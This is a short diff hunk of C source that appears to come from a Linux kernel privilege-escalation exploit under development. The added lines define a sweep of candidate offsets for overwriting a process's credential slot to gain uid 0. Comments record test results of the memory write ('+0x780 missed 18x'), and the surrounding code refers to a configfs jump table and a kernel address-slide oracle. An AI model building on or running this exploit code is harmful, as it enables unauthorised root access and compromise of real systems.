@@ -33,6 +33,13 @@ uintptr_t binwrite_target;
  * traffic never sees the configfs read JT. */
 int g_swap_staged;
 long g_uid0_child_pid;
+/* cred-slot sweep (08-30 canary proof: store lands EXACTLY at the aimed
+ * slot; +0x790 comm verified. +0x780 missed 18x => wrong slot for this
+ * build. Candidates: Z29 family + runtime_struct_offsets family. */
+const uint64_t g_uid0_slot_candidates[] = {0x900, 0x8F8, 0x780, 0x778,
+                                           0x798, 0x788};
+int g_uid0_slot_idx;
+uintptr_t g_uid0_task_base;
 char g_bootid_before[80];
 
 /* Landing signal for the SLIDE oracle: boot_id changes iff the
